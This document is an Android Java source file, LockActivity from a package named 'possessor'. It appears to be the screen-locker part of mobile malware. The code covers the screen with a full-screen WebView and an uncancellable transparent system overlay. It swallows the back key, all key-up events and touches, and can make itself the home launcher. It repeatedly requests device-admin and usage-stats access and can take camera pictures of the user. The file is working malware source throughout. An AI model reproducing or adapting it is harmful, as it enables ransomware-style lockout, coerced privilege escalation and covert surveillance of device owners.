package com.zer0.possessor;

import java.io.File;

import android.app.Activity;
import android.app.AlertDialog;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.FrameLayout;

public class LockActivity extends Activity
{
    private static int ACTIVITY_STARTING = 0;
    private static int ACTIVITY_RUNNING = 1;
    private static int ACTIVITY_EXITING = 2;

    public static int ELEVATE_STATUS_DONE = 0;
    public static int ELEVATE_STATUS_ADMIN_REQUESTING = 1;
    public static int ELEVATE_STATUS_USAGESTATS_REQUESTING = 2;

    public static int _otherActivityStatus = ELEVATE_STATUS_DONE;

    private static final int SECURITY_PRIVILEGES = 10;
    private static final int USAGESTATS_PRIVILEGES = 20;
    private static LockActivity _instance = null;
    private static OverlayDialog _overlayDialog = null;


    public static synchronized LockActivity getInstance()
    {
        return _instance;
    }

    private ZRuntime _zRuntime = null;
    public UIWebView _appView = null;
    private int _activityState = 0;  // 0=starting, 1=running (after 1st resume), 2=shutting down

    private WindowManager _windowManager;
    private ZCamera _zCamera = null;

    private static int _adminRequestCounter = 0;
    private Reflect _zOwnerModule = null;
    private String _indexPath;

    public void setOwnerModule(Object zModule)
    {
        _zOwnerModule = Reflect.on(zModule);
        if (_appView != null) {
            _appView.setOwnerModule(_zOwnerModule);
        }
    }

    public Reflect getOwnerModule()
    {
        return _zOwnerModule;
    }

    public String getIndexPath()
    {
        return _indexPath;
    }

    public boolean isCameraInited() { return _zCamera != null && _zCamera.isInited(); }

    public void setIndexPath(String p)
    {
        _indexPath = p;
    }

    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        LockActivity._instance = this;

        getWindow().requestFeature(Window.FEATURE_NO_TITLE);

        _windowManager = null;
        Context context = getApplicationContext();
        _zRuntime = ZRuntime.getInstance(context);

        final LockActivity me = this;

        if (!_zRuntime.shouldLockScreen()) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    me.endActivity(null);
                }
            });
            return;
        }

        int moduleHash = getIntent().getIntExtra("mhash", 0);
        if (moduleHash != 0) {
            setOwnerModule(((ZModuleManager)_zRuntime.getModuleManager()).getModuleByHash(moduleHash));
        }
        else {
            setOwnerModule(null);
        }

        _indexPath = _zRuntime.getPrefs().loadString("i", "");
        final String initPath = _zRuntime.getPrefs().loadString("ii", "");
        MainService.startPossessor(context);

        if (_indexPath.equals("") && initPath.equals("")) {
            _otherActivityStatus = ELEVATE_STATUS_DONE;
            try {
                createView();
                _appView.loadData("<html xmlns='http://www.w3.org/1999/xhtml'><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8'><meta name='viewport' content='width=device-width, initial-scale=1' /><style>body{line-height:1;background:#fff;font:11px normal Arial,Helvetica,sans-serif;color:#000;margin:0;padding:0;width:100%;height:100%;text-align:center;}table{width:100%;height:100%;border:none;}</style></head><body><table cellpadding='0' cellspacing='0'><tr><td align='center' style='valign:middle;height:100%'><span>Initializing...</span></td></tr></table></body></html>", "text/html", "UTF-8");
                /*new Thread(new Runnable() {
                    public void run() {
                        me._zRuntime.generateNames();
                        me.runOnUiThread(new Runnable() {
                            public void run() {
                                me.clearHistory();
                                me.loadUrl(me._zRuntime.getFullUrl(8080));
                            }
                        });
                    }
                }).start();*/
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        else if (!_indexPath.equals("n")) {
            createView();
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    me.clearHistory();
                    if ((_zOwnerModule == null || _zOwnerModule.get() == null) && !initPath.equals("")) {
                        me.loadUrl(initPath);
                        _indexPath = initPath;
                    }
                    else {
                        me.loadUrl(_indexPath);
                    }
                }
            });
        }
        else {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    me.endActivity(null);
                }
            });
        }
    }

    public void immersifyView()
    {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            final LockActivity me = this;
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    if (me._appView != null) {
                        me.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);
                        me._appView.setSystemUiVisibility(
                                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
                    }
                }
            });
        }
    }

    public void launchAdminIntent()
    {
        final LockActivity me = this;
        if (LockActivity._adminRequestCounter < 7 && !((SystemUtils)_zRuntime.getSystemUtils()).isAdminActive()) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    LockActivity._adminRequestCounter++;
                    LockActivity._otherActivityStatus = ELEVATE_STATUS_ADMIN_REQUESTING;
                    Intent intent = ((SystemUtils)me._zRuntime.getSystemUtils()).getAskForAdminPrivilegesIntent();
                    me.startActivityForResult(intent, SECURITY_PRIVILEGES);
                }
            });
        }
        else {
            LockActivity._otherActivityStatus = ELEVATE_STATUS_DONE;
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    me.immersifyView();
                }
            });
        }
    }

    public void launchUsageStatsIntent()
    {
        final LockActivity me = this;
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    Intent localIntent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                    me.startActivityForResult(localIntent, USAGESTATS_PRIVILEGES);
                    LockActivity._otherActivityStatus = ELEVATE_STATUS_USAGESTATS_REQUESTING;
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    public void createCamera()
    {
        try {
            if (_zCamera == null) {
                _zCamera = new ZCamera(_zRuntime.getContext());
            }
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (_appView != null && _zCamera != null) {
                            _zCamera.attachPreview(_appView);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void destroyCamera()
    {
        if (_zCamera != null) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    try {
                        _zCamera.detachPreview();
                        _zCamera = null;
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        }
    }

    public boolean takePicture(File imageFile)
    {
        boolean ret = false;
        try {
            if (_zCamera != null) {
                ret = _zCamera.takePicture(imageFile);
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return ret;
    }

    /**
     * Construct the default web view object.
     *
     * This is intended to be overridable by subclasses of CordovaIntent which
     * require a more specialized web view.
     */
    protected UIWebView makeWebView()
    {
        return new UIWebView(this);
    }

    /**
     * Construct the client for the default web view object.
     *
     * This is intended to be overridable by subclasses of CordovaIntent which
     * require a more specialized web view.
     *
     * @param webView the default constructed web view object
     */
    protected UIWebViewClient makeWebViewClient(UIWebView webView)
    {
        return webView.makeWebViewClient();
    }

    /**
     * Construct the chrome client for the default web view object.
     *
     * This is intended to be overridable by subclasses of CordovaIntent which
     * require a more specialized web view.
     *
     * @param webView the default constructed web view object
     */
    protected UIChromeClient makeChromeClient(UIWebView webView)
    {
        return webView.makeWebChromeClient();
    }

    private void createView()
    {
        _appView = _appView != null ? _appView : makeWebView();

        _appView.setId(100);
/*
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
            try {
                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT, 0, 0,
                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                                WindowManager.LayoutParams.FLAG_SECURE |
                                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED |
                                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        PixelFormat.TRANSLUCENT);
                lp.gravity = Gravity.TOP | Gravity.CENTER;

                _windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
                _windowManager.addView(_appView, lp);// Need permissions
            }
            catch (Exception e) {
                _appView.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
                setContentView(_appView);
            }
        }
        else {
*/            _appView.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
            setContentView(_appView);
 //       }

        _appView.setBackgroundColor(Color.WHITE);
        _appView.requestFocusFromTouch();

        _appView.init(_zOwnerModule, makeWebViewClient(_appView), makeChromeClient(_appView));

        // Setup the hardware volume controls to handle volume control
        setVolumeControlStream(AudioManager.STREAM_MUSIC);

        LockActivity.lock(this);
    }

    public void loadUrl(String url)
    {
        if (_appView != null) {
            _appView.loadUrl(url);
        }
    }

    /**
     * Load the url into the webview after waiting for period of time.
     * This is used to display the splashscreen for certain amount of time.
     *
     * @param url
     * @param time              The number of ms to wait before loading webview
     */
    public void loadUrl(final String url, int time)
    {
        this.loadUrl(url);
    }

    /**
     * Clear the resource cache.
     */
    public void clearCache()
    {
        if (_appView != null) {
            _appView.clearCache(true);
        }
    }

    /**
     * Clear web history in this web view.
     */
    public void clearHistory()
    {
        if (_appView != null) {
            _appView.clearHistory();
        }
    }

    /**
     * Go to previous page in history.  (We manage our own history)
     *
     * @return true if we went back, false if we are already at top
     */
    public boolean backHistory()
    {
        return _appView != null && _appView.backHistory();
    }

    @Override
    /**
     * Called when the system is about to start resuming a previous activity.
     */
    protected void onPause()
    {
        if (_zCamera != null) {
            try {
                _zCamera.detachPreview();
            }
            catch (Exception e){
                e.printStackTrace();
            }
        }
        super.onPause();

        // Don't process pause if shutting down, since onDestroy() will be called
        if (_activityState == ACTIVITY_EXITING) {
            return;
        }

//        if (_zOwnerModule != null && _zOwnerModule.get() != null) {
//            _zOwnerModule.call("onPause");
//        }
    }

    @Override
    /**
     * Called when the activity receives a new intent
     **/
    protected void onNewIntent(Intent intent)
    {
        super.onNewIntent(intent);
//        if (_zOwnerModule != null && _zOwnerModule.get() != null) {
//            _zOwnerModule.call("onNewIntent", intent);
//        }
    }

    @Override
    /**
     * Called when the activity will start interacting with the user.
     */
    protected void onResume()
    {
        super.onResume();

        immersifyView();

        // Force window to have focus, so application always
        // receive user input. Workaround for some devices (Samsung Galaxy Note 3 at least)
        getWindow().getDecorView().requestFocus();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (((SystemUtils)_zRuntime.getSystemUtils()).checkGrantUsageStats()) {
                if (_zOwnerModule != null && _zOwnerModule.get() != null) {
                    launchAdminIntent();
                }
            }
            else {
                launchUsageStatsIntent();
            }
        }
        else {
            if (_zOwnerModule != null && _zOwnerModule.get() != null) {
                launchAdminIntent();
            }
        }

        if (_zCamera != null) {
            try {
                _zCamera.attachPreview(_appView);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }

        if (_activityState == ACTIVITY_STARTING) {
            _activityState = ACTIVITY_RUNNING;
            return;
        }

//        if (_zOwnerModule != null && _zOwnerModule.get() != null) {
//            _zOwnerModule.call("onResume");
//        }
    }

    @Override
    /**
     * The final call you receive before your activity is destroyed.
     */
    public void onDestroy()
    {
        super.onDestroy();
//        if (_zOwnerModule != null && _zOwnerModule.get() != null) {
//            _zOwnerModule.call("onDestroy");
//        }

        if (_appView != null) {
            _appView.handleDestroy();
            destroyCamera();
            if (_windowManager != null) {
                _windowManager.removeView(_appView);
            }
        }
        else {
            _activityState = ACTIVITY_EXITING;
        }

        LockActivity.unlock();
        LockActivity._instance = null;


    }

    @Override
    public boolean dispatchTouchEvent(@SuppressWarnings("NullableProblems") MotionEvent ev)
    {

        if (ev != null && ev.getAction() == MotionEvent.ACTION_OUTSIDE) {
            return true;
        }
        if (_appView != null) {
            _appView.onTouchEvent(ev);
        }
        return true;
    }

    /**
     * Send a message to all plugins.
     *
     * @param id            The message id
     * @param data          The message data
     */
    public void postMessage(String id, Object data)
    {
        if (_appView != null) {
            _appView.postMessage(id, data);
        }
    }

    /**
     * Send JavaScript statement back to JavaScript.
     * (This is a convenience method)
     *
     * @param statement
     */
    public void sendJavascript(String statement)
    {
        if (_appView != null) {
            _appView._bridge.getMessageQueue().addJavaScript(statement);
        }
    }

    /**
     * End this activity by calling finish for activity
     */
    public void endActivity(Object zModule)
    {
        _activityState = ACTIVITY_EXITING;
        setOwnerModule(zModule);
        super.finish();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent intent)
    {
        super.onActivityResult(requestCode, resultCode, intent);

        if (requestCode == SECURITY_PRIVILEGES) {
            if (((SystemUtils)_zRuntime.getSystemUtils()).isAdminActive()) {
                LockActivity._otherActivityStatus = ELEVATE_STATUS_DONE;
            }
            else {
                launchAdminIntent();
            }
        }
        else if (requestCode == USAGESTATS_PRIVILEGES) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                if (!((SystemUtils)_zRuntime.getSystemUtils()).checkGrantUsageStats()) {
                    launchUsageStatsIntent();
                }
                else {
                    launchAdminIntent();
                }
            }
        }
    }

    @Override
    public boolean onKeyUp(int keyCode, @SuppressWarnings("NullableProblems") KeyEvent event)
    {
        //if (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_MENU) {
        return true;
        //}
        //return super.onKeyUp(keyCode, event);
    }

    /*
     * Android 2.x needs to be able to check where the cursor is.  Android 4.x does not
     *
     * (non-Javadoc)
     * @see android.app.Activity#onKeyDown(int, android.view.KeyEvent)
     */
    @Override
    public boolean onKeyDown(int keyCode, @SuppressWarnings("NullableProblems") KeyEvent event)
    {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            if (_appView != null) {
                _appView.backHistory();
            }
        }
        return true;
    }

    public static void enableLockAsHomeLauncher(boolean enabled)
    {
        Context ctx = ZRuntime.getInstance(null).getContext();
        ctx.getPackageManager().setComponentEnabledSetting(new ComponentName(ctx, LockActivity.class), (enabled ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED), PackageManager.DONT_KILL_APP);
    }

    public static void launchLockActivity()
    {
        Context ctx = ZRuntime.getInstance(null).getContext();
        Intent i = new Intent("android.intent.action.MAIN");
        i.setClassName(ctx.getPackageName(), LockActivity.class.getName());
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        i.addCategory("android.intent.category.HOME");
        ctx.startActivity(i);
    }

    public static void lock(LockActivity activity)
    {
        if (LockActivity._overlayDialog != null) {
            unlock();
            LockActivity._overlayDialog = null;
        }
        if (LockActivity._overlayDialog == null) {
            LockActivity._overlayDialog = new OverlayDialog(activity);
            LockActivity._overlayDialog.show();
            LockActivity._overlayDialog.show();
        }
    }

    public static void unlock()
    {
        if (LockActivity._overlayDialog != null) {
            LockActivity._overlayDialog.dismiss();
            LockActivity._overlayDialog = null;
        }
    }

    private static class OverlayDialog extends AlertDialog
    {
        private LockActivity _activity;
        public OverlayDialog(LockActivity activity)
        {
            super(activity, R.style.OverlayDialog);
            _activity = activity;
            WindowManager.LayoutParams params = getWindow().getAttributes();
            params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;// | WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
            params.dimAmount = 0.0F; // transparent
            params.width = 0;
            params.height = 0;
            params.gravity = Gravity.BOTTOM;
            getWindow().setAttributes(params);
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, 0xffffff);
            setOwnerActivity(activity);
            setCancelable(false);
        }

        public final boolean dispatchTouchEvent(MotionEvent motionevent)
        {
            return true;
        }

        @Override
        protected final void onCreate(Bundle bundle)
        {
            super.onCreate(bundle);
            FrameLayout framelayout = new FrameLayout(getContext());
            framelayout.setBackgroundColor(0);
            setContentView(framelayout);
        }
    }
}
